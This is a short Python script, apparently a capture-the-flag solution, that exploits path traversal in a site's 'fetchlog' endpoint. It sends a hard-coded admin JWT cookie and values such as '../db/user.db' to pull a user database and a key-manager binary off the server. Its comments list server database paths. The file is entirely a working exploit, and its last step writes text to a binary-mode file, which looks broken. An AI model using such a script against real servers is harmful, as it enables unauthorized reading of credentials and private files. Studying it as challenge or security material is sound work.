import requests

url = "https://suvwwcedmdcyelgn.ransommethis.net/znejayfsvdnrzptm/fetchlog"
admin_cookie = {'tok' : 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjcyMTgxMDQsImV4cCI6MTY2OTgxMDEwNCwic2VjIjoiZnhwSVUxNGhNQ1JnQnpyRUhWa2xDZlZ4VVlYQ2Zzd2UiLCJ1aWQiOjM5MjN9.yVi0flYeioqyITDEmDRGQxytQKMh3Kl_wd-VfRXDau0'}


# default path = /opt/ransommethis/log/" + log
# users db @ "/opt/ransommethis/db/user.db"
# victims db @ "/opt/ransommethis/db/victims.db"
filename = "../../keyMaster/keyMaster"
filename = "../db/user.db"
r = requests.get(url, params={'log': filename}, cookies=admin_cookie)
print(r.text)
with open(filename.split('/')[-1], 'wb+') as f:
    f.write(r.text)